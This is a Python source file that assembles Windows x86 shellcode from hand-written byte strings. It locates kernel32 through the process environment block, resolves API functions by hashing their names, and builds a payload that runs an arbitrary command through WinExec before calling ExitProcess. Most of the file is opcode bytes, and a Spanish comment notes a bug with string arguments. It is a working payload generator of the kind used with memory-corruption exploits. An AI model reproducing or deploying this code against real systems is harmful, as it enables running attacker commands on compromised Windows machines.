import struct

class BaseWin32Shellcode(object):
	def __init__(self):
		self.payload = ""
		self.kernel_addr = (
			"\x55"			#PUSH EBP
			"\x52"			#PUSH EDX
			"\x51"			#PUSH ECX
			"\x53"			#PUSH EBX
			"\x56"			#PUSH ESI
			"\x57"			#PUSH EDI
			"\x33\xC0"		#XOR EAX,EAX
			"\x64\x8B\x70\x30"	#MOV ESI,DWORD PTR FS:[EAX+30]
			"\x8B\x76\x0C"		#MOV ESI,DWORD PTR DS:[ESI+C]
			"\x8B\x76\x1C"		#MOV ESI,DWORD PTR DS:[ESI+1C]
			"\x8B\x6E\x08"		#MOV EBP,DWORD PTR DS:[ESI+8]
			"\x8B\x7E\x20"		#MOV EDI,DWORD PTR DS:[ESI+20]
			"\x8B\x36"		#MOV ESI,DWORD PTR DS:[ESI]
			"\x38\x47\x18"		#CMP BYTE PTR DS:[EDI+18],AL
			"\x75\xF3"		#JNZ SHORT 0014B4D1
			"\x80\x3F\x6B"
			"\x74\x07"
			"\x80\x3F\x4B"
			"\x74\x02"
			"\xEB\xE7"
			"\x8B\xC5"
			"\x5F"
			"\x5E"
			"\x5B"
			"\x59"
			"\x5A"
			"\x5D"
			"\xC3"
			)

		self.resolver = (
			"\x55"
			"\x52"
			"\x51"
			"\x53"
			"\x56"
			"\x57"
			"\x8B\x6C\x24\x1C"
			"\x85\xED"
			"\x74\x43"
			"\x8B\x45\x3C"
			"\x8B\x54\x28\x78"
			"\x03\xD5"
			"\x8B\x4A\x18"
			"\x8B\x5A\x20"
			"\x03\xDD"
			"\xE3\x30"
			"\x49"
			"\x8B\x34\x8B"
			"\x03\xF5"
			"\x33\xFF"
			"\x33\xC0"
			"\xFC"
			"\xAC"
			"\x84\xC0"
			"\x74\x07"
			"\xC1\xCF\x0D"
			"\x03\xF8"
			"\xEB\xF4"
			"\x3B\x7C\x24\x20"
			"\x75\xE1"
			"\x8B\x5A\x24"
			"\x03\xDD"
			"\x66\x8B\x0C\x4B"
			"\x8B\x5A\x1C"
			"\x03\xDD"
			"\x8B\x04\x8B"
			"\x03\xC5"
			"\x5F"
			"\x5E"
			"\x5B"
			"\x59"
			"\x5A"
			"\x5D"
			"\xC3"
			)


	def syscall(self, function, *args):

		pushers = ""
		for arg in args[::-1]:
			if type(arg) == int and 0 <= arg <= 0xffffffff:
				pushers += "\x68" + struct.pack("<L", arg)
			elif type(arg) == str:
				#esta bugueado si meto dos argumentos juntos
				#porque queda el anterior argumento corrido.
				chararray = arg + "\x00" + "\x00"*(3-len(arg)%4)
				for i in range(len(chararray),0,-4):
					pushers += "\x68" + chararray[i-4:i]
				pushers += "\x54" #PUSH ESP
		
		self.payload += "\xE9" + struct.pack("<L", len(self.kernel_addr) + len(self.resolver))
		self.payload += self.kernel_addr
		self.payload += self.resolver

		stackframe = "\x8B\xEC\x83\xC4\xE0"		#MOV EBP,ESP/ADD ESP,-20
		self.payload += stackframe

		self.payload += "\xE8" + struct.pack("<L", 0xffffffff-len(self.kernel_addr)-len(self.resolver)-len(stackframe)-4)
		self.payload += "\x50"		#PUSH EAX <- kernel32

		self.payload += "\x68" + struct.pack("<L", self.getcrc(function))
		self.payload += "\xFF\x75\xDC"	#PUSH [EBP-24]
		self.payload += "\xE8" + struct.pack("<L", 0xffffffff-len(self.payload)+len(self.kernel_addr)+1)

		self.payload += pushers
		self.payload += "\xFF\xD0"	#CALL EAX


	def quit(self):
		self.payload += "\x68" + struct.pack("<L", self.getcrc("ExitProcess"))
		self.payload += "\xFF\x75\xDC"
		self.payload += "\xE8" + struct.pack("<L", 0xffffffff-len(self.payload)+len(self.kernel_addr)+1)
		self.payload += "\xFF\xD0"


	def getcrc(self, function, checksum=0):
		try:
			temporal = ((checksum << 19 | checksum >> 13) + ord(function[0])) & 0xffffffff
		except IndexError:
			return checksum
		return self.getcrc(function[1:], temporal)

	def getfruit(self):
		return self.payload


class ExecShellcode(BaseWin32Shellcode):
	def __init__(self, command):
		super(ExecShellcode, self).__init__()
		self.syscall("WinExec", command)
		self.quit()

